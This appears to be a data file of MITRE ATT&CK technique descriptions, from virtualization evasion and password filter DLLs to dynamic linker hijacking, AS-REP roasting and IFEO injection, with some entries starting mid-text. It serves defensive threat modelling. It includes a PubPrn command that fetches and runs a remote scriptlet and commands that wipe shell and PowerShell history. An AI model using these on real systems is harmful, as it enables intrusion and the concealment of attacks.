) by generating many broadcast DISCOVER messages to exhaust a network’s DHCP allocation pool.",Description
T1049,System Network Connections Discovery,"Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network.    An adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.   [1]      [2]      [3]    Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.   Utilities and commands that acquire this information include  netstat , ""net use,"" and ""net session"" with  Net . In Mac and Linux,  netstat  and  lsof  can be used to list current connections.  who -a  and  w  can be used to show which users are currently logged in, similar to ""net session"".

T1497.001,Virtualization or Sandbox Evasion: System Checks,"Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from  Virtualization/Sandbox Evasion  during automated discovery to shape follow-on behaviors.   [1]      Specific checks will vary based on the target and/or adversary, but may involve behaviors such as  Windows Management Instrumentation ,  PowerShell ,  System Information Discovery , and  Query Registry  to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment.    Checks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size.    Other common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions.   [2]    In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output.    Hardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment.

T1556.002,Modify Authentication Process: Password Filter DLL,"Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated.    Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation.    Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.

T1027.002,Obfuscated Files or Information: Software Packing,"Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.   [1]       Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.

T1559,Inter-Process Communication,"Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern.    Adversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages/libraries or native interfaces such as Windows  Dynamic Data Exchange  or  Component Object Model . Linux environments support several different IPC mechanisms, two of which being sockets and pipes.   [1]    Higher level execution mediums, such as those of  Command and Scripting Interpreter s, may also leverage underlying IPC mechanisms.

T1216.001,System Script Proxy Execution: PubPrn,"Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a  Visual Basic  script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the  Windows Command Shell  via  Cscript.exe . For example, the following code publishes a printer within the specified domain:  cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com .   [1]      Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.   [2]    To do so, adversaries may set the second  script:  parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is  pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct . This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.   In later versions of Windows (10+),  PubPrn.vbs  has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to  LDAP:// , vice the  script:  moniker which could be used to reference remote code via HTTP(S).",Description

[1]    Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.   [2]      Adversaries may search in different closed databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex:  Phishing for Information  or  Search Open Websites/Domains ), establishing operational resources (ex:  Develop Capabilities  or  Obtain Capabilities ), and/or initial access (ex:  External Remote Services  or  Valid Accounts ).",Description

T1574.004,Hijack Execution Flow: Dylib Hijacking,"Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with  @rpath , which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the  LC_LOAD_WEAK_DYLIB  function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.   Adversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path.   [1]      [2]      [3]      [4]    Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.   [5]      [6]      [7]",Description

Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system.   [1]         Within cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.   Within macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host’s registered services on the network. For example, adversaries can use a mDNS query (such as  dns-sd -B _ssh._tcp . ) to find other systems broadcasting the ssh service.   [2]      [3]",Description

T1078,Valid Accounts,"Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.   [1]    Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.   In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.   [2]      The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.

T1564.010,Hide Artifacts: Process Argument Spoofing,"Adversaries may attempt to hide process command-line arguments by overwriting process memory. Process command-line arguments are stored in the process environment block (PEB), a data structure used by Windows to store various information about/used by a process. The PEB includes the process command-line arguments that are referenced when executing the process. When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB.   [1]      [2]      Adversaries may manipulate a process PEB to evade defenses. For example,  Process Hollowing  can be abused to spawn a process in a suspended state with benign arguments. After the process is spawned and the PEB is initialized (and process information is potentially logged by tools/sensors), adversaries may override the PEB to modify the command-line arguments (ex: using the  Native API   WriteProcessMemory()  function) then resume process execution with malicious arguments.   [3]      [2]      [4]      Adversaries may also execute a process with malicious command-line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis.   [5]      This behavior may also be combined with other tricks (such as  Parent PID Spoofing ) to manipulate or further evade process-based detections.",Description

T1546.014,Event Triggered Execution: Emond,"Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a  Launch Daemon  that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at  /sbin/emond  will load any rules from the  /etc/emond.d/rules/  directory and take action once an explicitly defined event takes place.   The rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path  /private/var/db/emondClients , specified in the  Launch Daemon  configuration file at /System/Library/LaunchDaemons/com.apple.emond.plist .   [1]      [2]      [3]      Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.

If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. In the case of self-signing, digital certificates will lack the element of trust associated with the signature of a third-party certificate authority (CA).   Adversaries may create self-signed SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex:  Asymmetric Cryptography  with  Web Protocols ) or even enabling  Adversary-in-the-Middle  if added to the root of trust (i.e.  Install Root Certificate ).

T1558.004,Steal or Forge Kerberos Tickets: AS-REP Roasting,"Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by  Password Cracking  Kerberos messages.   [1]       Preauthentication offers protection against offline  Password Cracking . When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user’s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user’s password.   [2]      For each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline  Password Cracking  attacks similarly to  Kerberoasting  and expose plaintext credentials.    [1]      [3]       An account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like  PowerShell  with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data.

T1580,Cloud Infrastructure Discovery,"An adversary may attempt to discover infrastructure and resources that are available within an infrastructure-as-a-service (IaaS) environment. This includes compute service resources such as instances, virtual machines, and snapshots as well as resources of other services including the storage and database services.   Cloud providers offer methods such as APIs and commands issued through CLIs to serve information about infrastructure. For example, AWS provides a  DescribeInstances  API within the Amazon EC2 API that can return information about one or more instances within an account, the  ListBuckets  API that returns a list of all buckets owned by the authenticated sender of the request, the  HeadBucket  API to determine a bucket’s existence along with access permissions of the request sender, or the  GetPublicAccessBlock  API to retrieve access block configuration for a bucket.   [1]      [2]      [3]      [4]    Similarly, GCP's Cloud SDK CLI provides the  gcloud compute instances list  command to list all Google Compute Engine instances in a project    [5]   , and Azure's CLI command  az vm list  lists details of virtual machines.   [6]    In addition to API commands, adversaries can utilize open source tools to discover cloud storage infrastructure through  Wordlist Scanning .   [7]      An adversary may enumerate resources using a compromised user's access keys to determine which are available to that user.   [8]    The discovery of these available resources may help adversaries determine their next steps in the Cloud environment, such as establishing Persistence.   [9]   An adversary may also use this information to change the configuration to make the bucket publicly accessible, allowing data to be accessed without authentication. Adversaries have also may use infrastructure discovery APIs such as  DescribeDBInstances  to determine size, owner, permissions, and network ACLs of database resources.    [10]    Adversaries can use this information to determine the potential value of databases and discover the requirements to access them. Unlike in  Cloud Service Discovery , this technique focuses on the discovery of components of the provided services rather than the services themselves.",Description

T1218.003,System Binary Proxy Execution: CMSTP,"Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles.    [1]    CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.   Adversaries may supply CMSTP.exe with INF files infected with malicious commands.    [2]    Similar to  Regsvr32  / ""Squiblydoo"", CMSTP.exe may be abused to load and execute DLLs    [3]     and/or COM scriptlets (SCT) from remote servers.

T1574.006,Hijack Execution Flow: Dynamic Linker Hijacking,"Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as  LD_PRELOAD  on Linux or  DYLD_INSERT_LIBRARIES  on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.   [1]      [2]      [3]    These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.   [4]      On Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. This method may also evade detection from security products since the execution is masked under a legitimate process. Adversaries can set environment variables via the command line using the  export  command,  setenv  function, or  putenv  function. Adversaries can also leverage  Dynamic Linker Hijacking  to export variables in a shell or set variables programmatically using higher level syntax such Python’s  os.environ .   On Linux, adversaries may set  LD_PRELOAD  to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program.  LD_PRELOAD  can be set via the environment variable or  /etc/ld.so.preload  file.   [1]      [2]    Libraries specified by  LD_PRELOAD  are loaded and mapped into memory by  dlopen()  and  mmap()  respectively.   [5]      [6]       [7]      [8]       On macOS this behavior is conceptually the same as on Linux, differing only in how the macOS dynamic libraries (dyld) is implemented at a lower level. Adversaries can set the  DYLD_INSERT_LIBRARIES  environment variable to point to malicious libraries containing names of legitimate libraries or functions requested by a victim program.   [9]      [10]      [11]",Description

T1548,Abuse Elevation Control Mechanism,Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.,Description

Information about an organization may also be exposed to adversaries via online or other accessible data sets (ex:  Social Media  or  Search Victim-Owned Websites ).   [1]      [2]    Gathering this information may reveal opportunities for other forms of reconnaissance (ex:  Phishing for Information  or  Search Open Websites/Domains ), establishing operational resources (ex:  Establish Accounts  or  Compromise Accounts ), and/or initial access (ex:  Phishing  or  Trusted Relationship ).",Description

T1564.001,Hide Artifacts: Hidden Files and Directories,"Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches ( dir /a  for Windows and  ls –a  for Linux and macOS).   On Linux and Mac, users can mark specific files as hidden simply by putting a ""."" as the first character in the file or folder name     [1]       [2]   . Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like ""ls"". Users must specifically change settings to have these files viewable.   Files on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app    [3]   . On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.   Adversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",Description

T1134,Access Token Manipulation,"Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.   An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e.  Token Impersonation/Theft ) or used to spawn a new process (i.e.  Create Process with Token ). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.   [1]      Any standard user can use the  runas  command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",Description

Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory,  %SystemRoot%\system32  (e.g.,  C:\Windows\system32 ), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.   For example, if  C:\example path  precedes C:\Windows\system32 is in the PATH environment variable, a program that is named net.exe and placed in  C:\example path  will be called instead of the Windows system ""net"" when ""net"" is executed from the command-line.",Description

T1068,Exploitation for Privilege Escalation,"Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.   When initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.   Adversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).   [1]      [2]    Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via  Ingress Tool Transfer  or  Lateral Tool Transfer .",Description

T1573.002,Encrypted Channel: Asymmetric Cryptography,"Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver’s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.   For efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as  Asymmetric Cryptography .",Description

T1499,Endpoint Denial of Service,"Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes   [1]    and to support other malicious activities, including distraction   [2]   , hacktivism, and extortion.   [3]      An Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).   To perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.   Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.   Botnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.   [4]      In cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.   [5]      For attacks attempting to saturate the providing network, see  Network Denial of Service .",Description

T1588.006,Obtain Capabilities: Vulnerabilities,"Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.   [1]      An adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e.  Exploits ) or to attempt to develop one themselves (i.e.  Exploits ).",Description
T1588.006,Obtain Capabilities: Vulnerabilities,"In 2017,  Sandworm Team  conducted technical research related to vulnerabilities associated with websites used by the Korean Sport and Olympic Committee, a Korean power company, and a Korean airport.   [2]",Procedure Examples
T1546,Event Triggered Execution,"Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events.   [1]      [2]      [3]      Adversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.   [4]      [5]      [6]      Since the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges.",Description
T1070.003,Indicator Removal: Clear Command History,"In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.   On Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable  HISTFILE . When a user logs off a system, this information is flushed to a file in the user's home directory called  ~/.bash_history . The benefit of this is that it allows users to go back to commands they've used before in different sessions.   Adversaries may delete their commands from these logs by manually clearing the history ( history -c ) or deleting the bash history file  rm ~/.bash_history .     Adversaries may also leverage a  Network Device CLI  on network devices to clear command history data ( clear logging  and/or  clear history ).   [1]      On Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the  PSReadLine  module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.   The  PSReadLine  command history tracks the commands used in all PowerShell sessions and writes them to a file ( $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt  by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.   [2]      Adversaries may run the PowerShell command  Clear-History  to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the  ConsoleHost_history.txt  file. Adversaries may also delete the  ConsoleHost_history.txt  file or edit its contents to hide PowerShell commands they have run.   [3]      [4]",Description

T1599,Network Boundary Bridging,"Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.   Devices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.   When an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via  Multi-hop Proxy  or exfiltration of data via  Traffic Duplication . Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with  Internal Proxy  to achieve the same goals.   [1]     In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.",Description
T1598.001,Phishing for Information: Spearphishing Service,"Adversaries may send spearphishing messages via third-party services to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex:  Establish Accounts  or  Compromise Accounts ) and/or sending multiple, seemingly urgent messages.   All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services.   [1]    These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries may create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and information about their environment. Adversaries may also use information from previous reconnaissance efforts (ex:  Social Media  or  Search Victim-Owned Websites ) to craft persuasive and believable lures.",Description
T1566.001,Phishing: Spearphishing Attachment,"Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon  User Execution  to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.   There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.",Description

T1546.012,Event Triggered Execution: Image File Execution Options Injection,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g.,  C:\dbg\ntsd.exe -g  notepad.exe ).    [1]      IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool.    [2]    IFEOs are represented as  Debugger  values in the Registry under  HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\    where  &lt;executable&gt;  is the binary on which the debugger is attached.    [1]      IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process).    [3]       [4]    Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\ .    [3]       [4]      Similar to  Accessibility Features , on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures ""cmd.exe,"" or another program that provides backdoor access, as a ""debugger"" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with  Remote Desktop Protocol  will cause the ""debugger"" program to be executed with SYSTEM privileges.    [5]      Similar to  Process Injection , these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer.    [6]    Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.   Malware may also use IFEO to  Impair Defenses  by registering invalid debuggers that redirect and effectively disable various system and security applications.    [7]       [8]",Description

T1535,Unused or Unsupported Cloud Regions,"Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure.   Cloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected.   A variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity.   An example of adversary use of unused AWS regions is to mine cryptocurrency through  Resource Hijacking , which can cost organizations substantial amounts of money over time depending on the processing power used.

Adversaries may gather this information in various ways, such as direct collection actions via  Active Scanning  or  Phishing for Information . Information about victim domains and their properties may also be exposed to adversaries via online or other accessible data sets (ex:  WHOIS ).   [1]      [2]      [3]    Where third-party cloud providers are in use, this information may also be exposed through publicly available API endpoints, such as GetUserRealm and autodiscover in Office 365 environments.   [4]      [5]    Gathering this information may reveal opportunities for other forms of reconnaissance (ex:  Search Open Technical Databases ,  Search Open Websites/Domains , or  Phishing for Information ), establishing operational resources (ex:  Acquire Infrastructure  or  Compromise Infrastructure ), and/or initial access (ex:  Phishing ).",Description

There exist a variety of cloud service providers that will sell virtual machines/containers as a service. Adversaries may compromise VPSs purchased by third-party entities. By compromising a VPS to use as infrastructure, adversaries can make it difficult to physically tie back operations to themselves.   [1]      Compromising a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers as well as that added by the compromised third-party.",Description

